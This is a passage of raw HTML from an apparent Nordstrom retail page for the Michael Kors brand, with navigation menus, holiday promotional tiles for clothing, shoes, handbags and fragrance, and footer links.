				<li class="nav-entry-nordstrom-gift-cards"><a href="http://shop.nordstrom.com/c/nordstrom-gift-cards?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Kids-_-Kids_Nordstrom Gift Cards">Nordstrom Gift Cards</a></li>
					<li class="spacer-hack"></li>
			</ul>
					<h3 class="stylewatch nav-entry-style-watch">Style Watch</h3>
			<ul>
				<li class="nav-entry-vacation-essentials"><a href="http://shop.nordstrom.com/c/kids-vacation-essentials?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Kids-_-Style Watch_Vacation Essentials">Vacation Essentials</a></li>
				<li class="nav-entry-activewear"><a href="http://shop.nordstrom.com/c/kids-active-shop?origin=topnav&amp;dept=8000001" manual_cm_sp="Top Navigation-_-Kids-_-Style Watch_Activewear">Activewear</a></li>
					<li class="spacer-hack"></li>
		</ul>
					<h3 class="nav-entry-featured-shops">Featured Shops</h3>
			<ul>
				<li class="nav-entry-toys-gifts"><a href="http://shop.nordstrom.com/c/kids-toys?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Kids-_-Kids_Toys &amp; Gifts">Toys &amp; Gifts</a></li>
				<li class="nav-entry-disneys-frozen"><a href="http://shop.nordstrom.com/c/girls-frozen?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Kids-_-Kids_Disney&#39;s Frozen">Disney&#39;s Frozen</a></li>
				<li class="nav-entry-cold-weather"><a href="http://shop.nordstrom.com/c/kids-winter-gear?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Kids-_-Kids_Cold Weather">Cold Weather</a></li>
				<li class="nav-entry-pajamas"><a href="http://shop.nordstrom.com/c/kids-sleepwear?origin=topnav&amp;dept=8000001" manual_cm_sp="Top Navigation-_-Kids-_-Kids_Pajamas">Pajamas</a></li>
				<li class="nav-entry-coats-jackets"><a href="http://shop.nordstrom.com/c/kids-coats-and-jackets?origin=topnav&amp;dept=8000001" manual_cm_sp="Top Navigation-_-Kids-_-Kids_Coats &amp; Jackets">Coats &amp; Jackets</a></li>
				<li class="nav-entry-sports-fan-gear"><a href="http://shop.nordstrom.com/c/kids-sports-fan?origin=topnav&amp;dept=8000001" manual_cm_sp="Top Navigation-_-Kids-_-Kids_Sports Fan Gear">Sports Fan Gear</a></li>
		</ul>

							</div>
					</div>
				</li>
				<li id="primary-nav-specialty" class="tab  js-pending-setup">
					<h2 role="presentation">
						<a id="specialty-tab" href="http://shop.nordstrom.com/c/home-gifts?dept=8000001&amp;origin=topnav" title="Specialty" aria-controls="specialty-panel" manual_cm_sp="Top Navigation-_-Specialty-_-Specialty">
							<span>Specialty</span>
						</a>
					</h2>
					<div id="specialty-panel" aria-labelledby="specialty-tab" class="nav-category nav-column-1">
							<div class="nav-category-column">
													<h3 class="nav-entry-home-gifts">Home &amp; Gifts</h3>
			<ul>
				<li class="nav-entry-wit-wonder"><a href="http://shop.nordstrom.com/c/wit-and-wonder-gifts?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Specialty-_-Home &amp; Gifts_Wit &amp; Wonder">Wit &amp; Wonder</a></li>
				<li class="nav-entry-holiday-decor"><a href="http://shop.nordstrom.com/c/holiday-decor-shop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Specialty-_-Home &amp; Gifts_Holiday Decor">Holiday Decor</a></li>
				<li class="nav-entry-bed,-bath-home-decor"><a href="http://shop.nordstrom.com/c/bed-bath-home-decor?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Specialty-_-Home &amp; Gifts_Bed, Bath &amp; Home Decor">Bed, Bath &amp; Home Decor</a></li>
				<li class="nav-entry-gifts-for-all-occasions"><a href="http://shop.nordstrom.com/c/gifts?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Specialty-_-Home &amp; Gifts_Gifts for All Occasions">Gifts for All Occasions</a></li>
				<li class="nav-entry-etsy-nordstrom-present"><a href="http://shop.nordstrom.com/c/etsy-nordstrom-present?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Specialty-_-Home &amp; Gifts_Etsy &amp; Nordstrom Present">Etsy &amp; Nordstrom Present</a></li>
				<li class="nav-entry-nordstrom-gift-cards"><a href="http://shop.nordstrom.com/c/nordstrom-gift-cards?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Specialty-_-Home &amp; Gifts_Nordstrom Gift Cards">Nordstrom Gift Cards</a></li>
					<li class="spacer-hack"></li>
		</ul>
					<h3 class="nav-entry-boutiques">Boutiques</h3>
			<ul>
				<li class="nav-entry-pop-in@nordstrom"><a href="http://shop.nordstrom.com/c/all-pop-in-olivia-kim?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Specialty-_-Boutiques_Pop-In@Nordstrom">Pop-In@Nordstrom</a></li>
				<li class="nav-entry-the-wedding-suite"><a href="http://shop.nordstrom.com/c/wedding-shop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Specialty-_-Boutiques_The Wedding Suite">The Wedding Suite</a></li>
				<li class="nav-entry-designer-collections"><a href="http://shop.nordstrom.com/c/designer-collections?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Specialty-_-Boutiques_Designer Collections">Designer Collections</a></li>
				<li class="nav-entry-topshop"><a href="http://shop.nordstrom.com/c/topshop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Specialty-_-Boutiques_Topshop">Topshop</a></li>
				<li class="nav-entry-topman"><a href="http://shop.nordstrom.com/c/topman?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Specialty-_-Boutiques_Topman">Topman</a></li>
					<li class="spacer-hack"></li>
		</ul>
					<h3 class="nav-entry-services">Services</h3>
			<ul>
				<li class="nav-entry-nordstrom-stylists"><a href="http://shop.nordstrom.com/c/nordstrom-stylists?origin=topnav&amp;dept=8000001" manual_cm_sp="Top Navigation-_-Specialty-_-Services_Nordstrom Stylists">Nordstrom Stylists</a></li>
				<li class="nav-entry-nordstrom-rewards"><a href="http://shop.nordstrom.com/c/rewards?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Specialty-_-Services_Nordstrom Rewards">Nordstrom Rewards</a></li>
				<li class="nav-entry-spa-nordstrom"><a href="http://shop.nordstrom.com/c/spa-nordstrom-shop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Specialty-_-Services_Spa Nordstrom">Spa Nordstrom</a></li>
		</ul>

							</div>
					</div>
				</li>
				<li id="primary-nav-sale" class="tab  js-pending-setup">
					<h2 role="presentation">
						<a id="sale-tab" href="http://shop.nordstrom.com/c/sale?dept=8000001&amp;origin=topnav" title="Sale" aria-controls="sale-panel" manual_cm_sp="Top Navigation-_-Sale-_-Sale">
							<span>Sale</span>
						</a>
					</h2>
					<div id="sale-panel" aria-labelledby="sale-tab" class="nav-category nav-column-1">
							<div class="nav-category-column">
												<h3 class="nav-entry-womens-sale"><a href="http://shop.nordstrom.com/c/all-womens-sale?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Sale-_-Women&#39;s Sale">Women&#39;s Sale</a></h3>
			<ul>
				<li class="nav-entry-clothing"><a href="http://shop.nordstrom.com/c/sale-womens-clothing?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Sale-_-Women&#39;s Sale_Clothing">Clothing</a></li>
				<li class="nav-entry-shoes"><a href="http://shop.nordstrom.com/c/sale-womens-shoes?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Sale-_-Women&#39;s Sale_Shoes">Shoes</a></li>
				<li class="nav-entry-handbags-accessories"><a href="http://shop.nordstrom.com/c/sale-handbags-accessories?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Sale-_-Women&#39;s Sale_Handbags &amp; Accessories">Handbags &amp; Accessories</a></li>
				<li class="nav-entry-designer-collections"><a href="http://shop.nordstrom.com/c/sale-designer?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Sale-_-Women&#39;s Sale_Designer Collections">Designer Collections</a></li>
					<li class="spacer-hack"></li>
		</ul>
				<h3 class="nav-entry-mens-sale"><a href="http://shop.nordstrom.com/c/all-mens-sale?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Sale-_-Men&#39;s Sale">Men&#39;s Sale</a></h3>
			<ul>
				<li class="nav-entry-clothing"><a href="http://shop.nordstrom.com/c/sale-mens-clothing?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Sale-_-Men&#39;s Sale_Clothing">Clothing</a></li>
				<li class="nav-entry-shoes"><a href="http://shop.nordstrom.com/c/sale-mens-shoes?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Sale-_-Men&#39;s Sale_Shoes">Shoes</a></li>
				<li class="nav-entry-accessories"><a href="http://shop.nordstrom.com/c/sale-mens-accessories?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Sale-_-Men&#39;s Sale_Accessories">Accessories</a></li>
				<li class="nav-entry-designer-collections"><a href="http://shop.nordstrom.com/c/sale-mens-designer-clothing-accessories-shoes?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Sale-_-Men&#39;s Sale_Designer Collections">Designer Collections</a></li>
					<li class="spacer-hack"></li>
		</ul>
				<h3 class="nav-entry-juniors-sale"><a href="http://shop.nordstrom.com/c/sale-juniors-clothing?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Sale-_-Juniors&#39; Sale">Juniors&#39; Sale</a></h3>
			<ul>
					<li class="spacer-hack"></li>
		</ul>
				<h3 class="nav-entry-kids-sale"><a href="http://shop.nordstrom.com/c/all-baby-kids-sale?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Sale-_-Kids&#39; Sale">Kids&#39; Sale</a></h3>
			<ul>
					<li class="spacer-hack"></li>
		</ul>
				<h3 class="nav-entry-home-gifts-sale"><a href="http://shop.nordstrom.com/c/sale-home-gifts?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Sale-_-Home &amp; Gifts Sale">Home &amp; Gifts Sale</a></h3>
			<ul>
					<li class="spacer-hack"></li>
		</ul>

							</div>
					</div>
				</li>
				<li id="primary-nav-pop-in" class="tab  js-pending-setup">
					<h2 role="presentation">
						<a id="pop-in-tab" href="http://shop.nordstrom.com/c/all-pop-in-olivia-kim?dept=8000001&amp;origin=topnav" title="Pop-In" aria-controls="pop-in-panel" manual_cm_sp="Top Navigation-_-Pop-In-_-Pop-In">
							<span>Pop-In</span>
						</a>
					</h2>
					<div id="pop-in-panel" aria-labelledby="pop-in-tab" class="nav-category nav-column-2">
	<section class="top-nav-story-tile">
		<div class="top-nav-story-media">
			<a href="http://shop.nordstrom.com/c/all-pop-in-olivia-kim?dept=8000001&amp;origin=topnav&campaign=PopInGlobal&cm_sp=merch-_-corp_PopInGlobal-_-topnavP01_shop" manual_cm_sp="Top Navigation-_-Pop-In-_-Pop-In At Nordstrom" title="Pop-In&commat;Nordstrom">
				<img alt="Pop-In&commat;Nordstrom" src="http://i.nordstromimage.com/images/default/shop/image/pop-in-shop/2014/0424/nav-pop-in-shop.jpg">
			</a>
		</div>
		<div class="top-nav-story-copy">
			<h3>Pop-In Shop</h3>
			<p>Exclusive finds with a new theme each month.</p>
			<p class="call-to-action">Shop: <a href="http://shop.nordstrom.com/c/all-pop-in-olivia-kim?dept=8000001&amp;origin=topnav&campaign=PopInGlobal&cm_sp=merch-_-corp_PopInGlobal-_-topnavP01_shop" manual_cm_sp="Top Navigation-_-Pop-In-_-Pop-In At Nordstrom">Pop-In</a></p>
		</div>
	</section>
	<section class="top-nav-story-tile">
		<div class="top-nav-story-media">
			<a href="http://shop.nordstrom.com/c/olivia-kim?dept=8000001&amp;origin=topnav&campaign=PopInGlobal&cm_sp=merch-_-corp_PopInGlobal-_-topnavP02_info" manual_cm_sp="Top Navigation-_-Pop-In-_-What's Up, Olivia" title="What's Up, Olivia">
				<img alt="What's Up, Olivia" src="http://i.nordstromimage.com/images/default/shop/image/pop-in-shop/2014/0424/nav-pop-in-olivia.jpg">
			</a>
		</div>
		<div class="top-nav-story-copy">
			<h3>What&rsquo;s Up, Olivia</h3>
			<p>Our director of creative projects shares what she&rsquo;s into.</p>
			<p class="call-to-action"><a href="http://shop.nordstrom.com/c/olivia-kim?dept=8000001&amp;origin=topnav&campaign=PopInGlobal&cm_sp=merch-_-corp_PopInGlobal-_-topnavP02_info" manual_cm_sp="Top Navigation-_-Pop-In-_-What's Up, Olivia">Read More</a></p>
		</div>
	</section>
	<section class="top-nav-story-tile">
		<div class="top-nav-story-media">
			<a href="http://shop.nordstrom.com/c/nordstrom-blogs?dept=8000001&amp;origin=topnav&campaign=PopInGlobal&cm_sp=merch-_-corp_PopInGlobal-_-topnavP03_info" manual_cm_sp="Top Navigation-_-Pop-In-_-Blogs and More" title="Blogs and More">
				<img alt="Blogs and More" src="http://i.nordstromimage.com/images/default/shop/image/pop-in-shop/2014/0424/nav-pop-in-blogs.jpg">
			</a>
		</div>
		<div class="top-nav-story-copy">
			<h3>Blogs + More</h3>
			<p>Stay updated with a steady stream of new info.</p>
			<p class="call-to-action"><a href="http://shop.nordstrom.com/c/nordstrom-blogs?dept=8000001&amp;origin=topnav&campaign=PopInGlobal&cm_sp=merch-_-corp_PopInGlobal-_-topnavP03_info" manual_cm_sp="Top Navigation-_-Pop-In-_-Blogs and More">Read More</a></p>
		</div>
	</section>
					</div>
				</li>
	</ul>
</nav>

</header>
<a id="skip-nav-end" href="#skip-nav" tabindex="-1" class="ada-hidden ada-skip-nav">Main Content</a>
		<div id="main" role="main" aria-label="Main Content" class="page-rule">



		<nav id="breadcrumb-nav" role="navigation" aria-label="Breadcrumb Navigation">
			<ul>

				<li><a href="/?origin=breadcrumb">Home</a></li>
						<li><span>/</span><a href ="http://shop.nordstrom.com/c/brands-list?origin=breadcrumb">Brands</a></li>
						<li><span>/</span>Michael Kors</li>

			</ul>
		</nav>










<!-- BEGIN: Category Navigation -->
<nav id="category-nav" role="navigation" aria-label="Category Navigation">

					<hr />
		<ul class="nav-group">
	<li class="">
				<a href="http://shop.nordstrom.com/c/michael-kors?origin=leftnav" >Michael Kors</a>



	</li>
		</ul>
				<hr/>
		<ul class="nav-group">
	<li class="">
				<a href="http://shop.nordstrom.com/c/all-michael-kors?origin=leftnav" >All Michael Kors &amp; MICHAEL Michael Kors</a>



		<ul class="nav-group">
	<li class="">
				<a href="http://shop.nordstrom.com/c/michael-kors-bestsellers?origin=leftnav" >Bestsellers</a>



	</li>
		</ul>
	</li>
		</ul>
				<hr/>
		<ul class="nav-group">
	<li class="">
				<a href="http://shop.nordstrom.com/c/womens-michael-kors?origin=leftnav" >Women</a>



		<ul class="nav-group">
	<li class="">
				<a href="http://shop.nordstrom.com/c/michael-kors-womens-designer-collection?origin=leftnav" >Designer Collection</a>



	</li>
	<li class="">
				<a href="http://shop.nordstrom.com/c/michael-kors-womens-accessories?origin=leftnav" >Accessories</a>



	</li>
	<li class="">
				<a href="http://shop.nordstrom.com/c/michael-kors-womens-clothing?origin=leftnav" >Clothing</a>



	</li>
	<li class="">
				<a href="http://shop.nordstrom.com/c/michael-kors-perfume-for-women?origin=leftnav" >Perfume</a>



	</li>
	<li class="">
				<a href="http://shop.nordstrom.com/c/michael-kors-shoes?origin=leftnav" >Shoes</a>



	</li>
		</ul>
	</li>
		</ul>
				<hr/>
		<ul class="nav-group">
	<li class="">
				<a href="http://shop.nordstrom.com/c/mens-michael-kors?origin=leftnav" >Men</a>



		<ul class="nav-group">
	<li class="">
				<a href="http://shop.nordstrom.com/c/michael-kors-mens-clothing?origin=leftnav" >Clothing</a>



	</li>
	<li class="">
				<a href="http://shop.nordstrom.com/c/michael-kors-mens-watches?origin=leftnav" >Watches</a>



	</li>
	<li class="">
				<a href="http://shop.nordstrom.com/c/michael-kors-mens-accessories?origin=leftnav" >Accessories</a>



	</li>
		</ul>
	</li>
		</ul>
				<hr/>
		<ul class="nav-group">
	<li class="">
				<a href="http://shop.nordstrom.com/c/michael-kors-kids?origin=leftnav" >Kids</a>



	</li>
		</ul>
				<hr/>
				<h3>Special Sizes</h3>
		<ul class="nav-group">
	<li class="">
				<a href="http://shop.nordstrom.com/c/michael-kors-womens-plus?origin=leftnav" >Plus</a>



	</li>
	<li class="">
				<a href="http://shop.nordstrom.com/c/michael-kors-womens-petite?origin=leftnav" >Petite</a>



	</li>
		</ul>
				<hr/>
				<h3>The World of Michael Kors</h3>
		<ul class="nav-group">
	<li class="">
				<a href="http://shop.nordstrom.com/c/michael-kors-all?origin=leftnav" >Michael Kors</a>



	</li>
	<li class="">
				<a href="http://shop.nordstrom.com/c/michael-michael-kors-all?origin=leftnav" >MICHAEL Michael Kors</a>



	</li>
		</ul>


</nav>
<!-- END: Category Navigation -->

<div id="main-content">
			<h1>Michael Kors</h1>

		<section class="story-tile type-default no-header"  >
			

					<div id="" class="story-media">




<a href="all-michael-kors?campaign=1117mmkholiday" manual_cm_re="P01-_-1117boutiquep01-_-boutique_shopall" manual_cm_sp="merch-_-multi_1117mmkholiday-_-boutiquewcmP01_image" title="MICHAEL MICHAEL KORS">

<img alt="MICHAEL Michael Kors gifts: clothing, shoes, handbags and accessories." class="tile-image" height="592" src="http://c.nordstromimage.com/Assets/Division/WOMEN-S-SHOES/11-17-14-p01-cid1117149434-7-adam-5a0bb22f-c369-4b94-80eb-a3db0138e0d3-fil-file.jpg?Version=1" width="760" /></a>					</div>



<div class="story-copy style-light justify-left content-overlay" style=" left: 39px; top: 100px; width: 242px;">
				<div class="rich-text">
<p>Satisfy everyone's wants (including your own) with our guide to the most coveted gifts from MICHAEL Michael Kors.</p>
				</div>


<div class="link-list-wrapper"><h3 class="link-list-header">SHOP: </h3><ul class="link-list"><li><a href="all-michael-kors?campaign=1117mmkholiday" manual_cm_re="P01-_-1117boutiquep01-_-boutique_shopall" manual_cm_sp="merch-_-multi_1117mmkholiday-_-boutiquewcmP01_shop" title="MICHAEL MICHAEL KORS">MICHAEL MICHAEL KORS</a></li></ul></div>

</div>
		</section>

		<section class="story-tile type-quick-hit no-header"  >
			

					<div id="" class="story-media">




<a href="michael-kors-shoes?campaign=1117mmkholiday" manual_cm_re="P02-_-1117boutiquep02-_-boutique_shopall" manual_cm_sp="merch-_-multi_1117mmkholiday-_-boutiquewcmP02_image" title="MICHAEL MICHAEL KORS SHOES">

<img alt="MICHAEL Michael Kors shoes." class="tile-image" height="195" src="http://c.nordstromimage.com/Assets/Division/WOMEN-S-SHOES/11-17-14-p02-cid1117149435-7-adam-7a6635c2-3245-4a09-9749-a3db0138e1a1-fil-file.jpg?Version=1" width="240" /></a>					</div>



<div class="story-copy style-dark justify-center content-bottom" >


<div class="link-list-wrapper"><h3 class="link-list-header">SHOP: </h3><ul class="link-list"><li><a href="michael-kors-shoes?campaign=1117mmkholiday" manual_cm_re="P02-_-1117boutiquep02-_-boutique_shopall" manual_cm_sp="merch-_-multi_1117mmkholiday-_-boutiquewcmP02_shop" title="MICHAEL MICHAEL KORS SHOES">MICHAEL MICHAEL KORS SHOES</a></li></ul></div>

</div>
		</section>

		<section class="story-tile type-quick-hit no-header"  >
			

					<div id="" class="story-media">




<a href="michael-kors-womens-handbags-wallets?campaign=1117mmkholiday" manual_cm_re="P03-_-1117boutiquep03-_-boutique_shopall" manual_cm_sp="merch-_-multi_1117mmkholiday-_-boutiquewcmP03_image" title="MICHAEL MICHAEL KORS HANDBAGS &amp; WALLETS">

<img alt="MICHAEL Michael Kors handbags." class="tile-image" height="195" src="http://c.nordstromimage.com/Assets/Division/ACCESS/AT-HOME/11-17-14-p03-cid1117149436-7-adam-e58f14ed-502d-4ad9-af65-a3db0138e24f-fil-file.jpg?Version=1" width="240" /></a>					</div>



<div class="story-copy style-dark justify-center content-bottom" >


<div class="link-list-wrapper"><h3 class="link-list-header">SHOP: </h3><ul class="link-list"><li><a href="michael-kors-womens-handbags-wallets?campaign=1117mmkholiday" manual_cm_re="P03-_-1117boutiquep03-_-boutique_shopall" manual_cm_sp="merch-_-multi_1117mmkholiday-_-boutiquewcmP03_shop" title="MICHAEL MICHAEL KORS HANDBAGS &amp; WALLETS">MICHAEL MICHAEL KORS HANDBAGS & WALLETS</a></li></ul></div>

</div>
		</section>

		<section class="story-tile type-quick-hit no-header"  >
			

					<div id="" class="story-media">




<a href="michael-kors-womens-clothing?campaign=1117mmkholiday" manual_cm_re="P04-_-1117boutiquep04-_-boutique_shopall" manual_cm_sp="merch-_-multi_1117mmkholiday-_-boutiquewcmP04_image" title="MICHAEL MICHAEL KORS CLOTHING">

<img alt="MICHAEL Michael Kors clothing." class="tile-image" height="195" src="http://c.nordstromimage.com/Assets/Division/WOMENS-APPAREL/11-17-14-p04-cid1117149437-7-adam-7494c61c-c5db-417a-a344-a3db0138e318-fil-file.jpg?Version=1" width="240" /></a>					</div>



<div class="story-copy style-dark justify-center content-bottom" >


<div class="link-list-wrapper"><h3 class="link-list-header">SHOP: </h3><ul class="link-list"><li><a href="michael-kors-womens-clothing?campaign=1117mmkholiday" manual_cm_re="P04-_-1117boutiquep04-_-boutique_shopall" manual_cm_sp="merch-_-multi_1117mmkholiday-_-boutiquewcmP04_shop" title="MICHAEL MICHAEL KORS CLOTHING">MICHAEL MICHAEL KORS CLOTHING</a></li></ul></div>

</div>
		</section>

		<section class="story-tile type-default copy-only"  >
			




<div class="story-copy style-light justify-center content-bottom" style="background-color: #000000;">
<h2>MICHAEL KORS FRAGRANCE COLLECTION</h2>				<p class="">Sporty citrus, sexy amber and glam jasmine take center stage in the Michael Kors fragrance collection.</p>


<div class="link-list-wrapper"><h3 class="link-list-header">SHOP: </h3><ul class="link-list"><li><a href="michael-kors-perfume-for-women?campaign=0825boutiquep07" manual_cm_re="P07-_-0825boutiquep07-_-boutique_shopall" title="MICHAEL KORS PERFUME">MICHAEL KORS PERFUME</a></li></ul></div>

</div>
		</section>

</div>
		</div>




<!-- BEGIN: Footer -->
<footer id="site-footer" role="contentinfo" class="global-footer clearfix">


		<script type="text/javascript" id="recs-script-FTR">
			(function (global){
				global.nord.config.settings.push({
					'recommendations': {
						'placements': {
							'FTR': {"headerText":"Recently Viewed","headerLink":"","minRecs":1,"maxRecs":10,"layout":"Full Width Thumbnail","recsPerPage":10,"groupName":"","featureFlags":{},"recsSource":"Rich Relevance Recs API","recImage":null,"recMessage":"","msgYCoordinate":""}
						}
					}
				});
			})(window);
		</script>
		<section id="recs-placement-FTR" class="recs-placement hidden"></section>

	<section class="global-footer-promo">
				<section class="footer-story-tile">
					<div class="footer-story-media">
						<img src="http://i.nordstromimage.com/images/default/shop/image/pop-in-shop/2014/1120/footer-pop-in-shop.jpg" alt="Pop-In&#64;Nordstrom" />
					</div>
					<a class="footer-story-copy image-link" href="/c/pop-in-olivia-kim?campaign=PopInGlobal&cm_sp=merch-_-corp_PopInGlobal-_-swpfooterP00_image"></a>
					<div class="footer-story-copy copy-1">
						<h3 class="ada-hidden">Pop-In Shop</h3>
						<p>Exclusive finds with a new theme each month.</p>
						<p class="call-to-action">
							<a href="/c/pop-in-olivia-kim?campaign=PopInGlobal&cm_sp=merch-_-corp_PopInGlobal-_-swpfooterP01_shop">Shop Now</a>
						</p>
					</div>
					<div class="footer-story-copy copy-2">
						<h3 class="ada-hidden">What&rsquo;s Up, Olivia</h3>
						<p>Our Director of Creative Projects shares what she&rsquo;s into.</p>
						<p class="call-to-action">
							<a href="/c/olivia-kim?campaign=PopInGlobal&cm_sp=merch-_-corp_PopInGlobal-_-swpfooterP02_info">Check It Out</a>
						</p>
					</div>
					<div class="footer-story-copy copy-3">
						<h3 class="ada-hidden">Blogs + More</h3>
						<p>Stay updated with a steady stream of new info.</p>
						<p class="call-to-action">
							<a href="/c/nordstrom-blogs?campaign=PopInGlobal&cm_sp=merch-_-corp_PopInGlobal-_-swpfooterP03_info">Read More</a>
						</p>
					</div>
				</section>




<section id="text-promotion-footerpromo" class="text-promo">
	<h2>Want a Personal Stylist?</h2>
	<p>
		It&#39;s fast, fun, free...and zero pressure.
			
				<a href="personal-stylists?origin=footer-promo" manual_cm_sp="merch-_-corp_0218personalstylist-_-swpfooter_info" title="Get started">Get started</a>.
			
	</p>
</section>		<a href="#" class="back-to-top">Back to top</a>
	</section>

	<nav id="footer-navigation" class="global-footer-navigation clearfix page-rule">
			<section id="link-group-footer-link-group-customer-service" class="link-group">
				

<div class="link-list-wrapper"><h3 class="link-list-header">Customer Service </h3><ul class="link-list"><li><a href="customer-service" manual_cm_re="Customer Service4-_-Customer Service5-_-Customer Service6" manual_cm_sp="Ajith_Customer Service1-_-Customer Service2-_-Customer Service3" title="Customer Service">Customer Service</a></li><li><a href="http://www.nordstromcard.com/eCustService" title="Pay Bill Online">Pay Bill Online</a></li><li><a href="https://secure.nordstrom.com/orderlookup.aspx" title="Check Order Status">Check Order Status</a></li><li><a href="return-policy" title="Returns &amp; Exchanges">Returns & Exchanges</a></li><li><a href="customer-service-shipping-options-charges" title="Shipping Methods &amp; Charges">Shipping Methods & Charges</a></li><li><a href="product-recall" title="Product Recall">Product Recall</a></li><li><a href="customer-service-contact-us?origin=footer" title="Contact Us">Contact Us</a></li><li><a href="live-chat" id="live-chat-link" title="Live Chat">Live Chat</a></li><li><a href="international-shopping?previousUrl=http%3a%2f%2fshop.nordstrom.com%2fc%2fmichael-kors" id="international-shopping-link" title="Change Country">Change Country</a></li></ul></div>
			</section>
			<section id="link-group-footer-link-group-more-to-explore" class="link-group">
				

<div class="link-list-wrapper"><h3 class="link-list-header">More to Explore </h3><ul class="link-list"><li><a href="nordstrom-gift-cards" title="Gift Cards">Gift Cards</a></li><li><a href="rewards-cards" title="Apply for a Nordstrom Card">Apply for a Nordstrom Card</a></li><li><a href="rewards" manual_cm_re="FR4-_-FR5-_-FR6" manual_cm_sp="FR1-_-FR2-_-FR3" title="Nordstrom Rewards">Nordstrom Rewards™</a></li><li><a href="nordstrom-stylists" title="Nordstrom Stylists">Nordstrom Stylists</a></li><li><a href="true-fit-size-recommendations?ReturnURL=http%3a%2f%2fshop.nordstrom.com%2fc%2fmichael-kors" title="Find Your True Fit">Find Your True Fit</a></li><li><a href="catalogs" title="Shop Our Catalogs">Shop Our Catalogs</a></li><li><a href="http://m.nordstrom.com/" title="Mobile Site">Mobile Site</a></li><li><a href="sitemap" title="Site Map">Site Map</a></li></ul></div>
			</section>
			<section id="link-group-footer-link-group-about-us" class="link-group">
				

<div class="link-list-wrapper"><h3 class="link-list-header">About Us </h3><ul class="link-list"><li><a href="about-us" manual_cm_re="Ab4-_-Ab5-_-Ab6" manual_cm_sp="Ab1-_-Ab2-_-Ab3" title="About Us">About Us </a></li><li><a href="http://about.nordstrom.com/careers" title="Careers">Careers</a></li><li><a href="stores" title="Store Locations &amp; Events">Store Locations & Events</a></li><li><a href="http://www.nordstromrack.com?sid=100054" title="Nordstrom Rack">Nordstrom Rack</a></li><li><a href="http://ca.nordstrom.com/" title="Nordstrom Canada">Nordstrom Canada</a></li><li><a href="http://restaurants.nordstrom.com/" title="Nordstrom Restaurants">Nordstrom Restaurants</a></li><li><a href="nordstrom-cares" title="Nordstrom Cares">Nordstrom Cares</a></li><li><a href="http://www.hautelook.com?sid=100058" title="HauteLook">HauteLook</a></li><li><a href="http://investor.nordstrom.com" title="Investor Relations">Investor Relations</a></li><li><a href="affiliate-program" title="Become an Affiliate">Become an Affiliate</a></li><li><a href="http://press.nordstrom.com/" title="Press Releases">Press Releases</a></li></ul></div>
			</section>

				<section id="link-group-featured-searches" class="link-group">
					

<div class="link-list-wrapper"><h3 class="link-list-header">Featured Searches </h3><ul class="link-list"><li><a href="perfume" manual_cm_re="4-_-5-_-6" manual_cm_sp="1-_-2-_-3" title="Perfume">Perfume</a></li><li><a href="bose" manual_cm_re="1-_-2-_-3" manual_cm_sp="1-_-2-_-3" title="Bose® Headphones">Bose® Headphones</a></li><li><a href="womens-backpacks" manual_cm_re="4-_-5-_-6" manual_cm_sp="1-_-2-_-3" title="Backpacks">Backpacks</a></li><li><a href="christian-louboutin" manual_cm_re="4-_-5-_-6" manual_cm_sp="1-_-2-_-3" title="Christian Louboutin">Christian Louboutin</a></li><li><a href="clarks" manual_cm_re="4-_-5-_-6" manual_cm_sp="1-_-2-_-3" title="Clarks®">Clarks®</a></li></ul></div>
				</section>
	</nav>
	<section class="global-footer-social page-rule">
		<div>
					<h3>


<a href="/c/conversation-connect-with-us?origin=footer" manual_cm_re="CU_RE_C4-_-CU_RE_C5-_-CU_RE_C6" manual_cm_sp="CU_SP_C1-_-CU_SP_C2-_-CU_SP_C3" title="Connect with Us">Connect with Us</a>
					</h3>





<a class="footer-social-button svg-footer-facebook" href="http://www.facebook.com/Nordstrom" manual_cm_re="C4-_-C5-_-C6" manual_cm_sp="C1-_-C2-_-C3" target="_blank" title="Facebook">


<svg viewBox='0, 0, 30, 30'><use xlink:href='#facebook'/>facebook</svg></a>


<a class="footer-social-button svg-footer-twitter" href="http://twitter.com/nordstrom" target="_blank" title="Twitter">


<svg viewBox='0, 0, 30, 30'><use xlink:href='#twitter'/>twitter</svg></a>


<a class="footer-social-button svg-footer-pinterest" href="http://www.pinterest.com/nordstrom/" target="_blank" title="Pinterest">


<svg viewBox='0, 0, 30, 30'><use xlink:href='#pinterest'/>pinterest</svg></a>


<a class="footer-social-button svg-footer-instagram" href="http://instagram.com/nordstrom" target="_blank" title="Instagram">


<svg viewBox='0, 0, 30, 30'><use xlink:href='#instagram'/>instagram</svg></a>


<a class="footer-social-button svg-footer-youtube" href="http://www.youtube.com/nordstrom" target="_blank" title="YouTube">


